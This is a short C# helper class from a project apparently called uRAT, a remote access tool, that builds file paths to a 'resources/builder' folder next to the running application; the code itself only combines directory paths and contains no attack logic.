using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace uRAT.Server.Tools
{
    internal enum ResourceFamily
    {
        Builder
    }

    internal static class ResourcesHelper
    {
        public static string GetResourcePath(ResourceFamily family)
        {
            var outPath = Path.Combine(Application.StartupPath, "resources");
            switch (family)
            {
                case ResourceFamily.Builder:
                    outPath = Path.Combine(outPath, "builder");
                    break;
            }
            return outPath;
        }

        public static string GetResourceFile(ResourceFamily family, string filename)
        {
            var outPath = GetResourcePath(family);
            return Path.Combine(outPath, filename);
        }
    }
}
